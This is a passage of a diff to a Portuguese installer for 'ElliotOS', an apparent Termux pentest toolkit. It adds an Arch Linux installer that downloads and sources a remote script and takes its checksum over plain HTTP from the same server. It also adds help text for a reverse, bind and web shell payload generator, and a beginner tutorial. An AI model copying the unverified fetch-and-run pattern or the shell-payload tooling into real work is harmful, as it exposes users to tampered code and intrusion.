yAkIyAtZ3QgMCBdOyBkbwogICAgY2FzZSAiJDEiIGluIC0tZm9yY2V8LWYpIEZPUkNFPTE7IHNoaWZ0OzsgLS1vdXQpIE9VVF9ESVI9IiQyIjsgc2hpZnQgMjs7IC0tKikgX3dhcm4gIk9wY2FvIGRlc2NvbmhlY2lkYTogJDEiOyBzaGlmdDs7ICopIFsgLXogIiRBUEtfRklMRSIgXSAmJiBBUEtfRklMRT0iJDEiIHx8IE9VVF9ESVI9IiQxIjsgc2hpZnQ7OyBlc2FjCiAgZG9uZQogIFsgLXogIiRBUEtfRklMRSIgXSAmJiB7IF9jbWRfaGVscDsgZXhpdCAxOyB9CiAgWyAtZiAiJEFQS19GSUxFIiBdIHx8IF9lcnIgIkFQSyBuYW8gZW5jb250cmFkbzogJEFQS19GSUxFIgogIHB5dGhvbjMgLWMgImltcG9ydCB6aXBmaWxlOyB6aXBmaWxlLlppcEZpbGUoJyRBUEtfRklMRScpIiAyPi9kZXYvbnVsbCB8fCBfZXJyICJBcnF1aXZvIGludmFsaWRvOiAkQVBLX0ZJTEUiCiAgWyAteiAiJE9VVF9ESVIiIF0gJiYgT1VUX0RJUj0iLi8kKGJhc2VuYW1lICIkQVBLX0ZJTEUiIC5hcGspX3dlYiIKICBpZiBbIC1kICIkT1VUX0RJUiIgXSAmJiBbICIkRk9SQ0UiIC1lcSAwIF07IHRoZW4KICAgIHByaW50ZiAnXDAzM1sxOzMzbSAgIiVzIiBqYSBleGlzdGUuIFNvYnJlc2NyZXZlcj8gW3MvTl0gXDAzM1swbScgIiRPVVRfRElSIgogICAgSUZTPSByZWFkIC1yIF9yIDwvZGV2L3R0eQogICAgY2FzZSAiJF9yIiBpbiBzfFN8eXxZKSA6OzsgKikgcHJpbnRmICcgIENhbmNlbGFkby5cblxuJzsgZXhpdCAwOzsgZXNhYwogIGZpCiAgX2hlYWQgJ2FwcGZvcmdlIGFwazJ3ZWInOyBfaW5mbyAiQVBLOiAkQVBLX0ZJTEUiOyBfaW5mbyAiU2FpZGE6ICRPVVRfRElSIgogIG1rZGlyIC1wICIkT1VUX0RJUiI7IF9pbmZvICdFeHRyYWluZG8uLi4nCiAgcHl0aG9uMyAtICIkQVBLX0ZJTEUiICIkT1VUX0RJUiIgPDwgJ1BZRU9GJwppbXBvcnQgc3lzLG9zLHppcGZpbGUKYXBrLG91dD1zeXMuYXJndlsxXSxzeXMuYXJndlsyXQpXRT17Jy5odG1sJywnLmh0bScsJy5jc3MnLCcuanMnLCcuanNvbicsJy5zdmcnLCcueG1sJywnLnBuZycsJy5qcGcnLCcuanBlZycsJy5naWYnLCcud2VicCcsJy5pY28nLCcudHRmJywnLndvZmYnLCcud29mZjInLCcub3RmJywnLm1wMycsJy5vZ2cnLCcud2F2JywnLnR4dCcsJy5tZCd9CmM9eydodG1sJzowLCdjc3MnOjAsJ2pzJzowLCdvdGhlcic6MH0Kd2l0aCB6aXBmaWxlLlppcEZpbGUoYXBrLCdyJykgYXMgemY6CiAgICBlbnRyaWVzPXpmLm5hbWVsaXN0KCkKICAgIHBmeD0nYXNzZXRzL3d3dy8nCiAgICB3ZT1bZSBmb3IgZSBpbiBlbnRyaWVzIGlmIGUuc3RhcnRzd2l0aChwZngpIGFuZCBub3QgZS5lbmRzd2l0aCgnLycpXQogICAgaWYgbm90IHdlOiBwZng9J2Fzc2V0cy8nOyB3ZT1bZSBmb3IgZSBpbiBlbnRyaWVzIGlmIGUuc3RhcnRzd2l0aChwZngpIGFuZCBub3QgZS5lbmRzd2l0aCgnLycpXQogICAgd2U9W2UgZm9yIGUgaW4gd2UgaWYgb3MucGF0aC5zcGxpdGV4dChlLmxvd2VyKCkpWzFdIGluIFdFXQogICAgaWYgbm90IHdlOiBwcmludCgnICBOZW5odW0gYXJxdWl2byB3ZWIgZW5jb250cmFkbycpOyBzeXMuZXhpdCgwKQogICAgZm9yIGUgaW4gd2U6CiAgICAgICAgcmVsPWVbbGVuKHBmeCk6XQogICAgICAgIGlmIG5vdCByZWw6IGNvbnRpbnVlCiAgICAgICAgZGVzdD1vcy5wYXRoLmpvaW4ob3V0LHJlbCk7IG9zLm1ha2VkaXJzKG9zLnBhdGguZGlybmFtZShkZXN0KSxleGlzdF9vaz1UcnVlKQogICAgICAgIHdpdGggemYub3BlbihlKSBhcyBzLG9wZW4oZGVzdCwnd2InKSBhcyBkOiBkLndyaXRlKHMucmVhZCgpKQogICAgICAgIGV4dD1vcy5wYXRoLnNwbGl0ZXh0KHJlbC5sb3dlcigpKVsxXQogICAgICAgIGlmIGV4dCBpbignLmh0bWwnLCcuaHRtJyk6IGNbJ2h0bWwnXSs9MQogICAgICAgIGVsaWYgZXh0PT0nLmNzcyc6IGNbJ2NzcyddKz0xCiAgICAgICAgZWxpZiBleHQ9PScuanMnOiBjWydqcyddKz0xCiAgICAgICAgZWxzZTogY1snb3RoZXInXSs9MQpwcmludChmJyAgb2sge3N1bShjLnZhbHVlcygpKX0gYXJxdWl2b3MgKEhUTUw6e2NbImh0bWwiXX0gQ1NTOntjWyJjc3MiXX0gSlM6e2NbImpzIl19IE91dHJvczp7Y1sib3RoZXIiXX0pJykKUFlFT0YKICBfZGltICJSZWJ1aWxkOiBhcHBmb3JnZSBidWlsZCAnJE9VVF9ESVInIC0tbmFtZSBcIkFwcFwiIgogIHByaW50ZiAnXG4nCn0KY2FzZSAiJHsxOi1oZWxwfSIgaW4KICBidWlsZCkgICAgc2hpZnQ7IF9jbWRfYnVpbGQgICAgIiRAIiA7OwogIGFwazJ3ZWIpICBzaGlmdDsgX2NtZF9hcGsyd2ViICAiJEAiIDs7CiAgdGVtcGxhdGUpIHNoaWZ0OyBfY21kX3RlbXBsYXRlICIkQCIgOzsKICBjaGVjaykgICAgc2hpZnQ7IF9jbWRfY2hlY2sgICAgIiRAIiA7OwogIGljb24pICAgICBzaGlmdDsgX2NtZF9pY29uICAgICAiJEAiIDs7CiAgbWFufC0tbWFuKSAgICAgIF9jbWRfbWFuICA7OwogIGhlbHB8LS1oZWxwfC1oKSBfY21kX2hlbHAgOzsKICAqKSBpZiBbIC1mICIkMSIgXSAmJiBwcmludGYgJyVzJyAiJDEiIHwgZ3JlcCAtcWkgJ1wuYXBrJCc7IHRoZW4gX2NtZF9hcGsyd2ViICIkQCIKICAgICBlbGlmIFsgLWQgIiQxIiBdIHx8IFsgIiQxIiA9ICctLXVybCcgXTsgdGhlbiBfY21kX2J1aWxkICIkQCIKICAgICBlbHNlIF9jbWRfaGVscDsgZmkgOzsKZXNhYwo='
 import base64 as _b64
 script = _b64.b64decode(script_b64).decode('utf-8')
 with open(path, 'w') as f:
@@ -98639,11 +99046,350 @@ ELLEOF
         echo "export LUA_PATH=\"${_ELL_LUA_DIR}/?.lua;\${LUA_PATH:-}\"" >> "$HOME/.bashrc"
     _ok "ell instalado — use: ell = require('ell')"
 
+
+    # ── Grava instalador do Arch Linux ARM ─────────────────────────────────
+    _step "📦" "Instalando install-arch.sh em ${SCRIPTS_DIR}..."
+    mkdir -p "${SCRIPTS_DIR}"
+    cat > "${SCRIPTS_DIR}/install-arch.sh" << 'INSTALL_ARCH_HEREDOC'
+
+################################################################################
+#                                                                              #
+# Termux Arch Installer.                                                       #
+#                                                                              #
+# Installs Arch Linux in Termux.                                               #
+#                                                                              #
+# Copyright (C) 2023-2025  Jore <https://github.com/jorexdeveloper>            #
+#                                                                              #
+# This program is free software: you can redistribute it and/or modify         #
+# it under the terms of the GNU General Public License as published by         #
+# the Free Software Foundation, either version 3 of the License, or            #
+# (at your option) any later version.                                          #
+#                                                                              #
+# This program is distributed in the hope that it will be useful,              #
+# but WITHOUT ANY WARRANTY; without even the implied warranty of               #
+# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the                #
+# GNU General Public License for more details.                                 #
+#                                                                              #
+# You should have received a copy of the GNU General Public License            #
+# along with this program.  If not, see <https://www.gnu.org/licenses/>.       #
+#                                                                              #
+################################################################################
+# shellcheck disable=SC2034,SC2155
+
+# ATTENTION!!! CHANGE BELOW FUNTIONS FOR DISTRO DEPENDENT ACTIONS!!!
+
+################################################################################
+# Called before any safety checks                                              #
+# New Variables: AUTHOR GITHUB LOG_FILE ACTION_INSTALL ACTION_CONFIGURE        #
+#                ROOTFS_DIRECTORY COLOR_SUPPORT (all available colors)         #
+################################################################################
+pre_check_actions() {
+	P=${W} # primary color
+	S=${C} # secondary color
+	T=${M} # tertiary color
+}
+
+################################################################################
+# Called before printing intro                                                 #
+# New Variables: none                                                          #
+################################################################################
+distro_banner() {
+	local spaces=$(printf "%*s" $((($(stty size | awk '{print $2}') - 38) / 2)) "")
+	msg -a "${spaces}${S}                   -'"
+	msg -a "${spaces}${S}                  .o+'"
+	msg -a "${spaces}${S}                 'ooo/"
+	msg -a "${spaces}${S}                '+oooo:"
+	msg -a "${spaces}${S}               '+oooooo:"
+	msg -a "${spaces}${S}               -+oooooo+:"
+	msg -a "${spaces}${S}             '/:-:++oooo+:"
+	msg -a "${spaces}${S}            '/++++/+++++++:"
+	msg -a "${spaces}${S}           '/++++++++++++++:"
+	msg -a "${spaces}${S}          '/+++ooooooooooooo/'"
+	msg -a "${spaces}${S}         ./ooosssso++osssssso+'"
+	msg -a "${spaces}${S}        .oossssso-''''/ossssss+'"
+	msg -a "${spaces}${S}       -osssssso.      :ssssssso."
+	msg -a "${spaces}${S}      :osssssss/        osssso+++."
+	msg -a "${spaces}${S}     /ossssssss/        +ssssooo/-"
+	msg -a "${spaces}${S}   '/ossssso+/:-        -:/+osssso+-"
+	msg -a "${spaces}${S}  '+sso+:-'                 '.-/+oso:"
+	msg -a "${spaces}${S} '++:.                           '-/+/"
+	msg -a "${spaces}${S} .'                                 '/"
+	msg -a "${spaces}${S}          ${P}${DISTRO_NAME}${S} ${T}${VERSION_NAME}${S}"
+}
+
+################################################################################
+# Called after checking architecture and required pkgs                         #
+# New Variables: SYS_ARCH LIB_GCC_PATH                                         #
+################################################################################
+post_check_actions() {
+	# Resolve arch to match arch linux
+	case "${SYS_ARCH}" in
+		armhf)
+			new_sys_arch=armv7
+			;;
+		arm64)
+			new_sys_arch=aarch64
+			;;
+		*)
+			new_sys_arch=${SYS_ARCH}
+			;;
+	esac
+}
+
+################################################################################
+# Called after checking for rootfs directory                                   #
+# New Variables: KEEP_ROOTFS_DIRECTORY                                         #
+################################################################################
+pre_install_actions() {
+	ARCHIVE_NAME=ArchLinuxARM-${new_sys_arch}-${VERSION_NAME}.tar.gz
+
+	# Fetch the current MD5 checksum directly from the server (avoids stale hardcoded hashes)
+	local md5_url="${BASE_URL}/${ARCHIVE_NAME}.md5"
+	local fetched_md5
+	fetched_md5=$(curl -fsSL "${md5_url}" 2>/dev/null)
+
+	if [[ -n "${fetched_md5}" ]]; then
+		TRUSTED_SHASUMS="${fetched_md5}"
+	else
+		echo "Warning: Could not fetch MD5 from ${md5_url}. Checksum verification may fail." >&2
+	fi
+}
+
+################################################################################
+# Called after extracting rootfs                                               #
+# New Variables: KEEP_ROOTFS_ARCHIVE                                           #
+################################################################################
+post_install_actions() {
+	return
+}
+
+################################################################################
+# Called before making configurations                                          #
+# New Variables: none                                                          #
+################################################################################
+pre_config_actions() {
+	return
+}
+
+################################################################################
+# Called after configurations                                                  #
+# New Variables: none                                                          #
+################################################################################
+post_config_actions() {
+	if [[ -f ${ROOTFS_DIRECTORY}/etc/locale.gen && -x ${ROOTFS_DIRECTORY}/sbin/locale-gen ]]; then
+		msg -tn "Generating locales..."
+		sed -i -E 's/#[[:space:]]?(en_US.UTF-8[[:space:]]+UTF-8)/\1/g' "${ROOTFS_DIRECTORY}"/etc/locale.gen
+
+		if distro_exec locale-gen &>>"${LOG_FILE}"; then
+			cursor -u1
+			msg -ts "Locales generated"
+		else
+			cursor -u1
+			msg -te "Failed to generate locales."
+		fi
+	fi
+
+	msg -tn "Setting up ${DISTRO_NAME} keyring..."
+
+	if distro_exec /bin/pacman-key --init &>>"${LOG_FILE}" && distro_exec /bin/pacman-key --populate archlinuxarm &>>"${LOG_FILE}"; then
+		cursor -u1
+		msg -ts "${DISTRO_NAME} keyring set up"
+	else
+		cursor -u1
+		msg -te "Failed to set up ${DISTRO_NAME} keyring"
+	fi
+
+	msg -tn "Removing ${DISTRO_NAME} kernel..."
+
+	if distro_exec /bin/pacman -Rnsc --noconfirm linux-"${new_sys_arch}" &>>"${LOG_FILE}" && distro_exec /bin/pacman -Scc --noconfirm &>>"${LOG_FILE}"; then
+		cursor -u1
+		msg -ts "${DISTRO_NAME} kernel removed"
+	else
+		cursor -u1
+		msg -ts "Failed to remove ${DISTRO_NAME}"
+	fi
+}
+
+################################################################################
+# Called before complete message                                               #
+# New Variables: none                                                          #
+################################################################################
+pre_complete_actions() {
+	if [[ ! ${DE_INSTALLED} ]] && ask -y -- -t "Install Desktop Environment?"; then
+		set_up_de && {
+			DE_INSTALLED=1
+			set_up_browser
+		}
+	fi
+}
+
+################################################################################
+# Called after complete message                                                #
+# New Variables: none                                                          #
+################################################################################
+post_complete_actions() {
+	return
+}
+
+################################################################################
+# Local Functions                                                              #
+################################################################################
+
+# Sets up the desktop environment
+set_up_de() {
+	if command -v termux-wake-lock &>>"${LOG_FILE}"; then
+		msg -tn "Acquiring Termux wake lock..."
+
+		if termux-wake-lock &>>"${LOG_FILE}"; then
+			cursor -u1
+			msg -ts "Termux wake lock held"
+		else
+			cursor -u1
+			msg -te "Failed to acquire Termux wake lock"
+		fi
+	fi
+
+	msg -tn "Installing desktop packages in ${DISTRO_NAME}..."
+	trap 'buffer -h; echo; msg -fem2; exit 130' INT
+	buffer -s
+
+	local pkgs=(tigervnc dbus xfce4)
+	if buffer -i pacman --color auto -Syu && distro_exec pacman --color auto -Syu &&
+		buffer -i pacman --color auto -Sy "${pkgs[@]}" && distro_exec pacman --color auto -Sy "${pkgs[@]}"; then
+		buffer -h3
+		trap - INT
+		cursor -u1
+		msg -ts "Desktop packages installed in ${DISTRO_NAME}"
+
+		msg -tn "Creating xstartup program..."
+
+		local xstartup=$(
+			cat 2>>"${LOG_FILE}" <<-EOF
+				#!/bin/bash
+				unset SESSION_MANAGER
+				unset DBUS_SESSION_BUS_ADDRESS
+
+				export XDG_RUNTIME_DIR=\${TMPDIR:-/tmp}/runtime-"\$(id -u)"
+				export SHELL=\${SHELL:-/bin/sh}
+
+				if [[ -r ~/.Xresources ]]; then
+				    xrdb ~/.Xresources
+				fi
+
+				exec startxfce4
+			EOF
+		)
+
+		if {
+			mkdir -p "${ROOTFS_DIRECTORY}"/root/.vnc &&
+				echo "${xstartup}" >"${ROOTFS_DIRECTORY}"/root/.vnc/xstartup &&
+				chmod 744 "${ROOTFS_DIRECTORY}"/root/.vnc/xstartup &&
+				if [[ ${DEFAULT_LOGIN} != root ]]; then
+					mkdir -p "${ROOTFS_DIRECTORY}"/home/"${DEFAULT_LOGIN}"/.vnc &&
+						echo "${xstartup}" >"${ROOTFS_DIRECTORY}"/home/"${DEFAULT_LOGIN}"/.vnc/xstartup &&
+						chmod 744 "${ROOTFS_DIRECTORY}"/home/"${DEFAULT_LOGIN}"/.vnc/xstartup
+				fi
+		} 2>>"${LOG_FILE}"; then
+			cursor -u1
+			msg -ts "Xstartup program created"
+		else
+			cursor -u1
+			msg -te "Failed create xstartup program"
+		fi
+	else
+		buffer -h5
+		trap - INT
+		cursor -u1
+		msg -te "Failed to install Desktop packages in ${DISTRO_NAME}"
+		return 1
+	fi
+}
+
+# Sets up the Browser
+set_up_browser() {
+	local available_browsers selected_browser selected_browsers suffix
+	available_browsers=(
+		"Chromium" "Firefox" "Chromium & Firefox"
+	)
+
+	choose -d2 -t "Select Browser" \
+		"${available_browsers[@]}"
+	selected_browser=${available_browsers[$((${?} - 1))]}
+
+	if [[ ${selected_browser} == "${available_browsers[-1]}" ]]; then
+		selected_browsers=("${available_browsers[@]:0:${#available_browsers[@]}-1}")
+		selected_browsers=("${selected_browsers[@]// /-}")
+		suffix=s
+	else
+		selected_browsers=("${selected_browser// /-}")
+		suffix=
+	fi
+
+	msg -tn "Installing ${selected_browser} Browser${suffix}..."
+	trap 'buffer -h; echo; msg -fem2; exit 130' INT
+	buffer -s
+
+	if buffer -i pacman --color auto -Sy "${selected_browsers[@],,}" && distro_exec pacman --color auto -Sy "${selected_browsers[@],,}"; then
+		if [[ ${selected_browsers[0]} == "${available_browsers[0]}" && -f "${ROOTFS_DIRECTORY}"/usr/share/applications/chromium.desktop ]]; then
+			sed -Ei 's/^(Exec=.*chromium).*(%U)$/\1 --no-sandbox \2/' "${ROOTFS_DIRECTORY}"/usr/share/applications/chromium.desktop
+		fi
+
+		buffer -h3
+		trap - INT
+		cursor -u1
+		msg -ts "${selected_browser} Browser${suffix} installed"
+	else
+		buffer -h5
+		trap - INT
+		cursor -u1
+		msg -te "Failed to install ${selected_browser} Browser${suffix}"
+	fi
+}
+
+DISTRO_NAME="Arch Linux ARM"
+PROGRAM_NAME=$(basename "${0}")
+DISTRO_REPOSITORY=termux-arch
+KERNEL_RELEASE=$(uname -r)
+VERSION_NAME=latest
+
+SHASUM_CMD=md5sum
+TRUSTED_SHASUMS=""  # Will be fetched dynamically in pre_install_actions
+
+ARCHIVE_STRIP_DIRS=0 # directories stripped by tar when extracting rootfs archive
+BASE_URL=http://os.archlinuxarm.org/os
+TERMUX_FILES_DIR=/data/data/com.termux/files
+
+DISTRO_SHORTCUT=${TERMUX_FILES_DIR}/usr/bin/arch
+DISTRO_LAUNCHER=${TERMUX_FILES_DIR}/usr/bin/archlinux
+
+DEFAULT_ROOTFS_DIR=${TERMUX_FILES_DIR}/archlinux
+DEFAULT_LOGIN=root
+
+# WARNING!!! DO NOT CHANGE BELOW!!!
+
+# Check in program's directory for template
+distro_template=$(realpath "$(dirname "${0}")")/termux-distro.sh
+
+# shellcheck disable=SC1090
+if [[ ! -f ${distro_template} ]]; then
+	curl -fsSL https://raw.githubusercontent.com/jorexdeveloper/termux-distro/main/termux-distro.sh \
+		-o "${distro_template}" &>/dev/null
+fi
+if [[ -f ${distro_template} ]]; then
+	source "${distro_template}" "${@}" || exit 1
+else
+	echo "You need an active internet connection to run this program."
+fi
+
+INSTALL_ARCH_HEREDOC
+    chmod +x "${SCRIPTS_DIR}/install-arch.sh"
+    _ok "install-arch.sh instalado em ${SCRIPTS_DIR}/install-arch.sh"
+
     MS="$PREFIX/bin/ms"
     rm -f "$MS"
 
-    SH_INTERP="/bin/sh"
-    [ "$OS_TYPE" = "termux" ] && SH_INTERP="/data/data/com.termux/files/usr/bin/sh"
+    SH_INTERP="/data/data/com.termux/files/usr/bin/bash"
+    [ "$OS_TYPE" != "termux" ] && SH_INTERP="/bin/bash"
     cat > "$MS" << MS_WRAPPER_EOF
 #!${SH_INTERP}
 # ElliotOS ms — wrapper com argumentos nativos
@@ -98792,6 +99538,11 @@ printf "  \033[1;32mms --env \033[0;33m[VAR]\033[0m             — variaveis de
 printf "\033[1;33m── Aprender / Exemplos ─────────────────────────────────────────\033[0m\n"
 printf "  \033[1;32mms --learn\033[0m                   — tutorial interativo em português\n"
 printf "  \033[1;32mms --examples\033[0m                — lista scripts de exemplo prontos\n"
+printf "  \033[1;32mms --doc\033[0m                     — documentação completa do sistema\n"
+printf "  \033[1;32mms --doc net\033[0m                 — módulo net.*\n"
+printf "  \033[1;32mms --doc mod\033[0m                 — módulo mod.* (23 scanners)\n"
+printf "  \033[1;32mms --doc crypto|sys|fs|ai\033[0m    — outros módulos\n"
+printf "  \033[1;32mms --payload\033[0m                 — gerador de payloads (reverse/bind/web shell)\n"
 printf "  \033[0;90m  Scripts: recon, portscan, webcheck, hashcrack, nexus\033[0m\n\n"
 
 printf "\033[1;33m── Scripts ─────────────────────────────────────────────────────\033[0m\n"
@@ -99506,19 +100257,1737 @@ print(D..parts[3]..Z)
 print(D..'(assinatura não verificada — sem chave secreta)'..Z)"
     ;;
   --learn)
+    _EX="${PREFIX:-/data/data/com.termux/files/usr}/share/lua-scripts"
+    if [ -f "\$_EX/learn.lua" ]; then
+      exec "\$_B" "\$_EX/learn.lua"
+    fi
+    # Tutorial interativo embutido — 35 licoes
+    _TOTAL=35
+    _learn_step() {
+      _LS_NUM="\${1:-0}"
+      _LS_TOT="\${2:-35}"
+      _LS_TIT="\${3:-}"
+      clear 2>/dev/null || true
+      printf "\n\033[1;35m╔══════════════════════════════════════════════════════════════════╗\033[0m\n"
+      printf "\033[1;35m║  ElliotOS — Tutorial  [Licao \$_LS_NUM/\$_LS_TOT]%-25s║\033[0m\n" ""
+      printf "\033[1;35m║  \033[1;33m%-64s\033[1;35m║\033[0m\n" "\$_LS_TIT"
+      printf "\033[1;35m╚═════════════════════════════════════════════════════════════════╝\033[0m\n\n"
+    }
+    _sec() {
+      printf "\033[1;36m  ── %s ──\033[0m\n\n" "\$1"
+    }
+    _ok() {
+      printf "\033[0;90m  \$@\033[0m\n"
+    }
+    _code() {
+      printf "  \033[1;32m\$@\033[0m\n"
+    }
+    _cont() {
+      printf "\n\033[0;90m  [ENTER para continuar]\033[0m "; read -r _dummy < /dev/tty
+    }
+    printf "\n\033[1;35m  ╔══════════════════════════════════════════════════════════╗\033[0m\n"
+    printf "\033[1;35m  ║        ElliotOS — Tutorial Completo                    ║\033[0m\n"
+    printf "\033[1;35m  ╚══════════════════════════════════════════════════════════╝\033[0m\n\n"
+    printf "  \033[1;33mTrilha 0:\033[0m \033[1;32mDo zero — Termux, terminal e logica\033[0m \033[0;90m(licoes  1-5)\033[0m\n"
+    printf "  \033[1;33mTrilha 1:\033[0m \033[1;32mLua — do zero ao avancado\033[0m           \033[0;90m(licoes  6-17)\033[0m\n"
+    printf "  \033[1;33mTrilha 2:\033[0m \033[1;32mLua + ElliotOS API\033[0m                  \033[0;90m(licoes 18-26)\033[0m\n"
+    printf "  \033[1;33mTrilha 3:\033[0m \033[1;32mC no ElliotOS\033[0m                       \033[0;90m(licoes 27-32)\033[0m\n"
+    printf "  \033[1;33mTrilha 4:\033[0m \033[1;32mProjetos reais de pentest\033[0m           \033[0;90m(licoes 33-35)\033[0m\n\n"
+    printf "  \033[0;90m35 licoes. ENTER avanca, Ctrl+C sai.\033[0m\n\n"
+    printf "  \033[0;90m[ENTER para comecar]\033[0m "; read -r _dummy < /dev/tty
+
+    # ══════════════════════════════════════════════════
+    # TRILHA 0 — DO ZERO: TERMUX, TERMINAL E LOGICA
+    # ══════════════════════════════════════════════════
+
+    _learn_step 1 35 "TRILHA 0 — O que e o Termux e para que serve"
+    _sec "O que e o Termux"
+    printf "  Termux e um aplicativo gratuito que transforma o seu Android\n"
+    printf "  num computador Linux de bolso — sem root, sem modificar nada.\n"
+    printf "  Dentro dele voce tem um terminal: uma tela preta onde voce\n"
+    printf "  digita comandos e o sistema responde.\n\n"
+    _sec "Por que usar o terminal"
+    printf "  No terminal voce faz coisas que app nenhum faz:\n"
+    printf "  escanear redes, testar seguranca, automatizar tarefas,\n"
+    printf "  criar ferramentas proprias — tudo pelo celular.\n\n"
+    _sec "Instalando o Termux (so uma vez)"
+    _ok "1. Acesse: https://f-droid.org"
+    _ok "2. Baixe e instale o F-Droid (loja alternativa, gratis)"
+    _ok "3. Dentro do F-Droid, busque 'Termux' e instale"
+    _ok "4. NAO instale o Termux da Play Store — versao desatualizada!"
+    printf "\n"
+    _sec "Abrindo o Termux"
+    _ok "Abra o app Termux. Voce vai ver uma tela preta com um cursor."
+    _ok "Isso e o terminal. Aqui voce manda — o sistema obedece."
+    _cont
+
+    _learn_step 2 35 "TRILHA 0 — Sobrevivendo no terminal"
+    _sec "O prompt — onde voce digita"
+    printf "  Voce vai ver algo assim:\n\n"
+    _code "\$ _"
+    printf "\n  O \033[1;32m\$\033[0m indica que o terminal esta esperando um comando.\n"
+    printf "  Digite o comando e aperte ENTER.\n\n"
+    _sec "Comandos essenciais do dia a dia"
+    printf "  \033[1;33m%-28s\033[0m %s\n" "pwd" "mostra em qual pasta voce esta"
+    printf "  \033[1;33m%-28s\033[0m %s\n" "ls" "lista arquivos da pasta atual"
+    printf "  \033[1;33m%-28s\033[0m %s\n" "ls -la" "lista com detalhes e arquivos ocultos"
+    printf "  \033[1;33m%-28s\033[0m %s\n" "cd nome-da-pasta" "entra numa pasta"
+    printf "  \033[1;33m%-28s\033[0m %s\n" "cd .." "volta uma pasta"
+    printf "  \033[1;33m%-28s\033[0m %s\n" "cd ~" "vai para sua pasta inicial (home)"
+    printf "  \033[1;33m%-28s\033[0m %s\n" "mkdir nome" "cria uma pasta nova"
+    printf "  \033[1;33m%-28s\033[0m %s\n" "touch arquivo.txt" "cria um arquivo vazio"
+    printf "  \033[1;33m%-28s\033[0m %s\n" "cat arquivo.txt" "mostra o conteudo de um arquivo"
+    printf "  \033[1;33m%-28s\033[0m %s\n" "rm arquivo.txt" "apaga um arquivo"
+    printf "  \033[1;33m%-28s\033[0m %s\n" "clear" "limpa a tela"
+    printf "\n"
+    _sec "Atalhos que salvam a vida"
+    printf "  \033[1;33m%-28s\033[0m %s\n" "seta para cima/baixo" "navega no historico de comandos"
+    printf "  \033[1;33m%-28s\033[0m %s\n" "TAB" "completa o nome do comando ou arquivo"
+    printf "  \033[1;33m%-28s\033[0m %s\n" "Ctrl+C" "cancela o comando que esta rodando"
+    printf "  \033[1;33m%-28s\033[0m %s\n" "Ctrl+L" "limpa a tela (igual ao clear)"
+    printf "\n"
+    _sec "Experimente agora"
+    _code "pwd"
+    _code "ls"
+    _code "cd ~"
+    _code "mkdir meu-primeiro-teste"
+    _code "ls"
+    _cont
+
+    _learn_step 3 35 "TRILHA 0 — Instalando o ElliotOS"
+    _sec "Preparando o Termux (so uma vez)"
+    printf "  Antes de instalar o ElliotOS, o Termux precisa de\n"
+    printf "  algumas ferramentas basicas. Copie e cole cada linha:\n\n"
+    _code "pkg update -y"
+    _ok "  (atualiza a lista de pacotes — pode demorar um pouco)"
+    printf "\n"
+    _code "pkg install -y git wget curl clang make readline"
+    _ok "  (instala compilador e ferramentas necessarias)"
+    printf "\n"
+    _sec "Baixando o ElliotOS"
+    _code "git clone https://github.com/mikeelliot218/ElliotOS.git"
+    _ok "  (baixa o ElliotOS do GitHub)"
+    printf "\n"
+    _code "cd ElliotOS"
+    _ok "  (entra na pasta do ElliotOS)"
+    printf "\n"
+    _sec "Instalando"
+    _code "bash luascript.sh"
+    _ok "  (compila e instala — pode demorar 2-5 minutos)"
+    printf "\n"
+    _sec "Testando se funcionou"
+    _code "ms -v"
+    _ok "  deve mostrar a versao do ElliotOS"
+    printf "\n"
+    _code "ms"
+    _ok "  abre o REPL — seu novo terminal de superpoderes"
+    _ok "  Para sair do REPL: Ctrl+C ou digite exit()"
+    _cont
+
+    _learn_step 4 35 "TRILHA 0 — O que e logica de programacao"
+    _sec "Programar e dar ordens ao computador"
+    printf "  Um programa e uma lista de instrucoes que o computador\n"
+    printf "  segue uma por uma, na ordem que voce escreveu.\n\n"
+    printf "  Pense assim: voce esta ensinando alguem muito obediente\n"
+    printf "  mas que nao pensa — faz EXATAMENTE o que voce mandou.\n\n"
+    _sec "Os tres blocos de qualquer programa"
+    printf "  \033[1;33m1. SEQUENCIA\033[0m — instrucoes em ordem\n"
+    _ok "     acorda -> escova dente -> toma cafe -> vai trabalhar"
+    printf "\n"
+    printf "  \033[1;33m2. DECISAO (if/else)\033[0m — escolher caminhos diferentes\n"
+    _ok "     SE ta chovendo → pega guarda-chuva"
+    _ok "     SENAO          → deixa em casa"
+    printf "\n"
+    printf "  \033[1;33m3. REPETICAO (loop)\033[0m — fazer algo varias vezes\n"
+    _ok "     ENQUANTO tiver roupa suja → lava uma peca"
+    printf "\n"
+    _sec "Variaveis — guardando informacoes"
+    printf "  Uma variavel e uma caixinha com nome que guarda um valor.\n\n"
+    _ok "  nome = 'Mike'      -- caixinha 'nome' guarda 'Mike'"
+    _ok "  idade = 25         -- caixinha 'idade' guarda 25"
+    _ok "  ativo = true       -- caixinha 'ativo' guarda verdadeiro"
+    printf "\n"
+    _sec "Tipos de dados"
+    printf "  \033[1;33m%-12s\033[0m %s\n" "numero" "42 / 3.14 / -7"
+    printf "  \033[1;33m%-12s\033[0m %s\n" "texto" "'ola mundo'  /  \"ElliotOS\""
+    printf "  \033[1;33m%-12s\033[0m %s\n" "booleano" "true  /  false"
+    printf "  \033[1;33m%-12s\033[0m %s\n" "nulo" "nil  (nada, vazio)"
+    printf "  \033[1;33m%-12s\033[0m %s\n" "lista" "{ 'a', 'b', 'c' }"
+    printf "\n"
+    _sec "Funcoes — ensinando o computador um truque novo"
+    printf "  Uma funcao e um bloco de codigo com nome que voce pode\n"
+    printf "  chamar quantas vezes quiser.\n\n"
+    _ok "  funcao saudar(nome):"
+    _ok "    mostrar 'Ola, ' + nome"
+    _ok ""
+    _ok "  saudar('Mike')   --> Ola, Mike"
+    _ok "  saudar('CYN')    --> Ola, CYN"
+    _cont
+
+    _learn_step 5 35 "TRILHA 0 — Seu primeiro programa no ElliotOS"
+    _sec "Abrindo o REPL"
+    printf "  O REPL e um ambiente onde voce digita Lua e ve o resultado\n"
+    printf "  na hora — sem precisar criar arquivo. Ideal para aprender.\n\n"
+    _code "ms"
+    _ok "  Voce vera o prompt:  ms>"
+    printf "\n"
+    _sec "Experimento 1 — o computador como calculadora"
+    _ok "  No prompt do ms, digite:"
+    _code "  print(2 + 2)"
+    _ok "  Resultado: 4"
+    _code "  print(10 * 3 - 5)"
+    _ok "  Resultado: 25"
+    _code "  print(2 ^ 10)"
+    _ok "  Resultado: 1024  (2 elevado a 10)"
+    printf "\n"
+    _sec "Experimento 2 — sua primeira variavel"
+    _code "  nome = 'Mike'"
+    _code "  print('Ola, ' .. nome)"
+    _ok "  Resultado: Ola, Mike"
